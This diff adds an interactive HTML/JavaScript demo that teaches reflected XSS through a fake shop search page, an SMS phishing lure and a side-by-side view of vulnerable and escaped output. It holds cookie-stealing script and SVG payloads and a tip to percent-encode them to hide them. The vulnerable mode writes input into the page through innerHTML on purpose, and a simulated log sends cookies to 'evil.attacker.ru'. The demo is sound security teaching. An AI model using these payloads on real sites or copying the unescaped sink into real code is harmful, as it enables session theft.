@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<link rel="stylesheet" href="_shared.css">
+<style>
+  body { padding: 6px 8px; }
+  .wrap { max-width: 1040px; margin: 0 auto; }
+  .head { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 7px; }
+  .mode { display: inline-flex; border: 1px solid #CDD8DA; border-radius: 8px; overflow: hidden; }
+  .mode button { border: 0; border-radius: 0; padding: 7px 13px; font-size: 12.5px; }
+  .mode button.on { background: #00567C; color: #fff; }
+  .mode button:not(.on) { background: #fff; color: #5C7880; }
+  .lede { font-size: 12.5px; color: #5C7880; line-height: 1.4; margin: 0 0 9px; }
+  .lede b { color: #00567C; } .lede em { color: #1F8F89; font-style: normal; font-weight: 700; }
+
+  .cols { display: grid; grid-template-columns: 1fr 1.22fr; gap: 11px; align-items: start; }
+  .panel { border: 1px solid #E0E7E8; border-radius: 10px; background: #fff; padding: 10px 11px; }
+  .ptitle { font-size: 11px; font-weight: 800; letter-spacing: .05em; text-transform: uppercase; margin-bottom: 7px; }
+  .ptitle.atk { color: #D64545; } .ptitle.vic { color: #00567C; }
+
+  /* attacker side */
+  input#q { width: 100%; font-family: "JetBrains Mono", Menlo, monospace; font-size: 12px; color: #12333D;
+    background: #F6F8F8; border: 1px solid #CDD8DA; border-radius: 6px; padding: 7px 8px; outline: none; }
+  input#q:focus { border-color: #00567C; background: #fff; }
+  .presets { margin-top: 7px; display: flex; flex-wrap: wrap; gap: 5px; }
+  .presets button { font-size: 10.5px; padding: 5px 8px; }
+  .presets .ph { width: 100%; font-size: 9.5px; color: #8AA1A8; letter-spacing: .05em; text-transform: uppercase; font-weight: 700; }
+
+  .urlbox { margin-top: 9px; border: 1px dashed #CDD8DA; border-radius: 7px; background: #F6F8F8; padding: 7px 8px; }
+  .urlbox .ul { font-size: 9.5px; text-transform: uppercase; letter-spacing: .05em; color: #8AA1A8; font-weight: 700; margin-bottom: 4px; }
+  .urlbox .u { font-family: "JetBrains Mono", monospace; font-size: 11px; color: #5C7880; line-height: 1.5; word-break: break-all; }
+  .urlbox .u .host { color: #12333D; font-weight: 700; }
+  .urlbox .u .inj { color: #D64545; font-weight: 700; background: rgba(214,69,69,.09); border-radius: 3px; }
+  .enc { margin-top: 6px; display: flex; align-items: center; gap: 6px; font-size: 10.5px; color: #5C7880; }
+  .enc input { accent-color: #00567C; }
+
+  .sendrow { margin-top: 9px; display: flex; align-items: center; gap: 8px; }
+  .sendrow button { font-size: 12px; padding: 7px 13px; }
+
+  .console { margin-top: 9px; background: #04303F; border-radius: 8px; padding: 8px 10px; font-family: "JetBrains Mono", monospace;
+    font-size: 11px; color: #9fc9cf; min-height: 46px; }
+  .console .ch { color: #5f97a3; font-size: 9.5px; text-transform: uppercase; letter-spacing: .08em; margin-bottom: 4px; }
+  .console .line { color: #7fe3dc; line-height: 1.5; word-break: break-all; }
+  .console .line .steal { color: #ff8a8a; font-weight: 700; }
+  .console .empty { color: #4d6b74; font-style: italic; }
+
+  /* victim side */
+  .chat { border: 1px solid #E0E7E8; border-radius: 8px; background: #F6F8F8; padding: 7px 8px; }
+  .chat .cwho { font-size: 9.5px; text-transform: uppercase; letter-spacing: .05em; color: #8AA1A8; font-weight: 700; margin-bottom: 5px; }
+  .bubble { background: #fff; border: 1px solid #DCE6E7; border-radius: 9px 9px 9px 2px; padding: 7px 9px; font-size: 12px; color: #12333D; }
+  .bubble.idle { color: #8AA1A8; font-style: italic; border-style: dashed; }
+  .bubble .lnk { display: block; margin-top: 5px; font-family: "JetBrains Mono", monospace; font-size: 10.5px;
+    color: #00567C; text-decoration: underline; cursor: pointer; word-break: break-all; }
+  .bubble .lnk:hover { color: #1F8F89; }
+  .bubble .hint { display: block; margin-top: 4px; font-size: 10px; color: #D64545; font-weight: 700; font-style: normal; }
+
+  .browser { margin-top: 9px; border: 1px solid #CDD8DA; border-radius: 8px; overflow: hidden; }
+  .bbar { display: flex; align-items: center; gap: 7px; background: #EEF3F3; padding: 5px 8px; border-bottom: 1px solid #CDD8DA; }
+  .bbar .dot { width: 8px; height: 8px; border-radius: 50%; background: #CDD8DA; flex: none; }
+  .bbar .u { font-family: "JetBrains Mono", monospace; font-size: 10px; color: #5C7880; white-space: nowrap;
+    overflow: hidden; text-overflow: ellipsis; flex: 1; }
+  .bbar .cookie { font-family: "JetBrains Mono", monospace; font-size: 10px; color: #1F8F89; flex: none; }
+  .page { padding: 9px 11px; min-height: 118px; background: #fff; position: relative; }
+  .page h4 { margin: 0 0 6px; font-size: 13.5px; color: #12333D; }
+  .page .echo { font-size: 12.5px; color: #12333D; }
+  .page .echo .lbl { color: #8AA1A8; }
+  .page .none { margin-top: 7px; font-size: 11.5px; color: #8AA1A8; }
+  .page .blank { color: #8AA1A8; font-style: italic; font-size: 12px; }
+  .flash { position: absolute; inset: 0; background: rgba(214,69,69,.92); color: #fff; display: none;
+    align-items: center; justify-content: center; flex-direction: column; gap: 3px; font-weight: 800; text-align: center; padding: 10px; }
+  .flash .big { font-size: 26px; } .flash .s { font-size: 11px; font-weight: 600; }
+
+  .after { margin-top: 7px; display: flex; align-items: center; gap: 8px; }
+  .after button { font-size: 10.5px; padding: 5px 9px; }
+  .after span { font-size: 10.5px; color: #8AA1A8; }
+
+  /* the wire */
+  .wire { margin-top: 10px; background: #04303F; border-radius: 9px; padding: 8px 11px 9px; }
+  .track { display: flex; align-items: center; gap: 9px; }
+  .track .end { font-family: "JetBrains Mono", monospace; font-size: 10px; color: #9fc9cf; flex: none; }
+  .rail { position: relative; flex: 1; height: 22px; border-top: 1px dashed rgba(159,201,207,.3); border-bottom: 1px dashed rgba(159,201,207,.3); }
+  .pkt { position: absolute; top: 2px; left: 0; height: 18px; line-height: 18px; padding: 0 7px; border-radius: 4px;
+    font-family: "JetBrains Mono", monospace; font-size: 10px; white-space: nowrap; opacity: 0; }
+  .pkt.req { background: #33D3CB; color: #04303F; font-weight: 700; }
+  .pkt.res { background: #D64545; color: #fff; font-weight: 700; }
+  .pkt.res.clean { background: #7fe0b0; color: #04303F; }
+  .lines { margin-top: 6px; font-family: "JetBrains Mono", monospace; font-size: 10.5px; line-height: 1.6; word-break: break-all; }
+  .lines .ln { color: #9fc9cf; }
+  .lines .ln .k { color: #5f97a3; }
+  .lines .ln .m { color: #33D3CB; font-weight: 700; }
+  .lines .ln .inj { color: #ff8a8a; font-weight: 700; }
+  .lines .ln .ok { color: #7fe0b0; font-weight: 700; }
+  .lines .ln.dim { color: #4d6b74; font-style: italic; }
+  .dbnote { margin-top: 6px; padding-top: 6px; border-top: 1px solid rgba(159,201,207,.18);
+    font-size: 11px; color: #7fe0b0; display: flex; justify-content: space-between; gap: 10px; }
+  .dbnote b { color: #fff; } .dbnote .r { color: #5f97a3; font-family: "JetBrains Mono", monospace; font-size: 10px; }
+</style>
+</head><body>
+<div class="wrap">
+  <div class="head">
+    <div class="mode">
+      <button id="mVuln" class="on">Server echoes your search term</button>
+      <button id="mSafe">Server encodes output</button>
+    </div>
+    <div style="font-size:11px;color:#8AA1A8;letter-spacing:.04em">search page · nothing is ever saved</div>
+  </div>
+  <p class="lede">Nothing is stored here. The search page just <b>repeats your query back at you</b> — &ldquo;no results for
+    <em>x</em>&rdquo;. So the attacker puts the script <b>in the link itself</b> and gets one victim to click it.</p>
+
+  <div class="cols">
+    <div class="panel">
+      <div class="ptitle atk">① Attacker · craft the link</div>
+      <input id="q" spellcheck="false" value="headphones">
+      <div class="presets">
+        <span class="ph">search term ↓</span>
+        <button data-p="headphones">Normal search</button>
+        <button data-p="&lt;script&gt;steal(document.cookie)&lt;/script&gt;">&lt;script&gt; stealer</button>
+        <button data-p="&lt;svg onload=&quot;steal(document.cookie)&quot;&gt;">…no &lt;script&gt; tag</button>
+      </div>
+      <div class="urlbox">
+        <div class="ul">the link you send</div>
+        <div class="u" id="url"></div>
+        <label class="enc"><input type="checkbox" id="encChk"> %-encode it, so the payload doesn't look like code</label>
+      </div>
+      <div class="sendrow"><button class="primary" id="send">Send the link ▶</button>
+        <span style="font-size:10.5px;color:#8AA1A8">by SMS, email, ad — anywhere</span></div>
+      <div class="console" id="console">
+        <div class="ch">🎯 attacker's server log</div>
+        <div class="empty" id="conEmpty">nothing captured yet…</div>
+        <div id="conLines"></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="ptitle vic">② Victim · one click, in their browser</div>
+      <div class="chat">
+        <div class="cwho">message from +966 5• ••• ••••</div>
+        <div class="bubble idle" id="bubble">nothing delivered yet — craft a link and send it</div>
+      </div>
+
+      <div class="browser">
+        <div class="bbar"><span class="dot"></span><span class="u" id="burl">about:blank</span>
+          <span class="cookie" id="cookie">🍪 session=VICTIM-9f3a2c</span></div>
+        <div class="page" id="page">
+          <div class="blank" id="blank">the victim hasn't opened anything yet</div>
+          <div id="content" style="display:none">
+            <h4>Search results</h4>
+            <div class="echo"><span class="lbl">You searched for:</span> <span id="echo"></span></div>
+            <div class="none">0 products matched.</div>
+          </div>
+          <div class="flash" id="flash"><span class="big">⚠</span><span>The link ran the attacker's script<br>in the victim's browser</span><span class="s" id="flashsub"></span></div>
+        </div>
+      </div>
+      <div class="after">
+        <button id="other">Someone else opens the search page normally</button>
+        <span id="othernote"></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="wire">
+    <div class="track">
+      <span class="end">victim’s browser</span>
+      <div class="rail" id="rail"><div class="pkt" id="pkt"></div></div>
+      <span class="end">shop.example.com</span>
+    </div>
+    <div class="lines">
+      <div class="ln dim" id="lnReq">no request yet — the payload is still sitting in a link, in a text message</div>
+      <div class="ln dim" id="lnRes">the page the server builds will appear here</div>
+    </div>
+    <div class="dbnote"><span>rows written to the database: <b>0</b> — this attack is never saved anywhere; it exists only inside the link</span><span class="r" id="hits">link opened: 0×</span></div>
+  </div>
+</div>
+
+<script>
+var VICTIM_COOKIE = "session=VICTIM-9f3a2c";
+var vuln = true, sent = false, busy = false, hits = 0;
+var q = document.getElementById("q"), urlEl = document.getElementById("url"), encChk = document.getElementById("encChk");
+var bubble = document.getElementById("bubble"), burl = document.getElementById("burl");
+var blank = document.getElementById("blank"), content = document.getElementById("content"), echo = document.getElementById("echo");
+var flash = document.getElementById("flash"), flashsub = document.getElementById("flashsub");
+var conLines = document.getElementById("conLines"), conEmpty = document.getElementById("conEmpty");
+var lnReq = document.getElementById("lnReq"), lnRes = document.getElementById("lnRes");
+var rail = document.getElementById("rail"), pkt = document.getElementById("pkt"), hitsEl = document.getElementById("hits");
+var othernote = document.getElementById("othernote");
+
+var BASE = "https://shop.example.com/search?q=";
+
+/* the victim page's own cookie — on http(s) the payload reads a real one */
+try { document.cookie = VICTIM_COOKIE + "; path=/"; } catch (e) {}
+
+function esc(s){ return String(s).replace(/[&<>"]/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]; }); }
+function clip(s, n){ s = String(s); return s.length > n ? s.slice(0, n) + "…" : s; }
+
+/* the XSS sink: whatever the reflected payload manages to run calls this */
+window.steal = function (c) {
+  var got = (c && String(c).indexOf("session=") !== -1) ? String(c) : VICTIM_COOKIE;
+  conEmpty.style.display = "none";
+  var d = document.createElement("div"); d.className = "line";
+  d.innerHTML = 'GET //evil.attacker.ru/steal?c=<span class="steal">' + esc(got) + '</span>';
+  conLines.appendChild(d);
+  flashsub.textContent = "stolen: " + got;
+  flash.style.display = "flex";
+  setTimeout(function(){ flash.style.display = "none"; }, 1500);
+};
+
+/* a server-rendered page runs a <script> the moment the browser parses it;
+   innerHTML deliberately doesn't, so re-create each one to match a real page */
+function activateScripts(container) {
+  Array.prototype.forEach.call(container.querySelectorAll("script"), function (old) {
+    var s = document.createElement("script");
+    s.textContent = old.textContent;
+    old.parentNode.replaceChild(s, old);
+  });
+}
+
+function payload(){ return q.value; }
+function wire(){ return encChk.checked ? encodeURIComponent(payload()) : payload(); }
+
+function drawUrl() {
+  urlEl.innerHTML = '<span class="host">' + esc(BASE) + '</span><span class="inj">' + esc(wire()) + '</span>';
+  if (sent) bubbleLink();
+}
+function bubbleLink() {
+  bubble.className = "bubble";
+  bubble.innerHTML = '🎁 Your order is ready! Track it here:' +
+    '<span class="lnk" id="lnk">' + esc(clip(BASE + wire(), 92)) + '</span>' +
+    '<span class="hint">▶ click the link — you are the victim now</span>';
+  document.getElementById("lnk").addEventListener("click", visit);
+}
+
+/* ---- the wire animation ---- */
+function travel(dir, label, cls, done) {
+  var w = rail.clientWidth;
+  pkt.className = "pkt " + cls;
+  pkt.textContent = label;
+  pkt.style.transition = "none";
+  var pw = 0;
+  pkt.style.opacity = "1";
+  pkt.style.transform = "translateX(0)";
+  pw = pkt.offsetWidth;                      // forces reflow too
+  var span = Math.max(w - pw, 10);
+  pkt.style.transform = dir > 0 ? "translateX(0)" : "translateX(" + span + "px)";
+  void pkt.offsetWidth;
+  pkt.style.transition = "transform 900ms linear";
+  pkt.style.transform = dir > 0 ? "translateX(" + span + "px)" : "translateX(0)";
+  setTimeout(function(){ pkt.style.opacity = "0"; done(); }, 950);
+}
+
+function reset(soft) {
+  pkt.style.opacity = "0";
+  flash.style.display = "none";
+  othernote.textContent = "";
+  if (!soft) {
+    blank.style.display = ""; content.style.display = "none"; burl.textContent = "about:blank";
+    lnReq.className = "ln dim"; lnReq.textContent = "no request yet — the payload is still sitting in a link, in a text message";
+    lnRes.className = "ln dim"; lnRes.textContent = "the page the server builds will appear here";
+  }
+}
+
+function visit() {
+  if (busy) return;
+  busy = true; reset(false);
+  var raw = payload(), onWire = wire();
+  burl.textContent = BASE + onWire;
+
+  lnReq.className = "ln";
+  lnReq.innerHTML = '<span class="m">GET</span> /search?q=<span class="inj">' + esc(clip(onWire, 90)) + '</span> ' +
+                    '<span class="k">Host: shop.example.com</span>';
+
+  travel(1, "q=" + clip(onWire, 34), "req", function () {
+    lnRes.className = "ln";
+    var decoded = '<span class="k">server decodes the query → </span><span class="inj">' + esc(clip(raw, 60)) + '</span>';
+    lnRes.innerHTML = decoded;
+
+    setTimeout(function () {
+      var body, cls;
+      if (vuln) {
+        lnRes.innerHTML = '<span class="k">200 OK · html: &lt;p&gt;You searched for: </span><span class="inj">' +
+          esc(clip(raw, 70)) + '</span><span class="k">&lt;/p&gt;</span>';
+        body = "reflected as HTML"; cls = "res";
+      } else {
+        lnRes.innerHTML = '<span class="k">200 OK · html: &lt;p&gt;You searched for: </span><span class="ok">' +
+          esc(esc(clip(raw, 60))) + '</span><span class="k">&lt;/p&gt; </span><span class="ok">← escaped on output</span>';
+        body = "escaped text"; cls = "res clean";
+      }
+      travel(-1, "200 OK · " + body, cls, function () {
+        blank.style.display = "none"; content.style.display = "";
+        if (vuln) { echo.innerHTML = raw; activateScripts(echo); }   // VULNERABLE: the query is written into the page as HTML
+        else { echo.textContent = raw; }                             // SAFE: encoded → shown as literal text, inert
+        hits++; hitsEl.textContent = "link opened: " + hits + "\u00d7";
+        busy = false;
+      });
+    }, 450);
+  });
+}
+
+/* ---- controls ---- */
+q.addEventListener("input", drawUrl);
+encChk.addEventListener("change", drawUrl);
+Array.prototype.forEach.call(document.querySelectorAll(".presets button"), function (b) {
+  b.addEventListener("click", function () {
+    q.value = b.getAttribute("data-p").replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,'"').replace(/&amp;/g,"&");
+    drawUrl();
+  });
+});
+document.getElementById("send").addEventListener("click", function(){ sent = true; reset(false); bubbleLink(); });
+document.getElementById("other").addEventListener("click", function(){
+  if (busy) return;
+  reset(false);
+  burl.textContent = BASE + "headphones";
+  blank.style.display = "none"; content.style.display = "";
+  echo.textContent = "headphones";
+  lnReq.className = "ln"; lnReq.innerHTML = '<span class="m">GET</span> /search?q=headphones <span class="k">Host: shop.example.com</span>';
+  lnRes.className = "ln"; lnRes.innerHTML = '<span class="k">200 OK · &lt;p&gt;You searched for: headphones&lt;/p&gt;</span>';
+  othernote.textContent = "clean — the payload was never on the server";
+});
+function setMode(v) {
+  vuln = v;
+  document.getElementById("mVuln").classList.toggle("on", v);
+  document.getElementById("mSafe").classList.toggle("on", !v);
+  reset(false);
+}
+document.getElementById("mVuln").addEventListener("click", function(){ setMode(true); });
+document.getElementById("mSafe").addEventListener("click", function(){ setMode(false); });
+
+drawUrl();
+
+/* ?state hook */
+(function(){ var st = new URLSearchParams(location.search).get("state");
+  if (!st) return;
+  if (st === "safe") setMode(false);
+  if (st === "enc") encChk.checked = true;
+  if (st === "steal" || st === "safe" || st === "enc") {
+    q.value = '<script>steal(document.cookie)<\/script>'; drawUrl();
+    sent = true; bubbleLink(); visit();
+  }
+})();
+</script>
+</body></html>
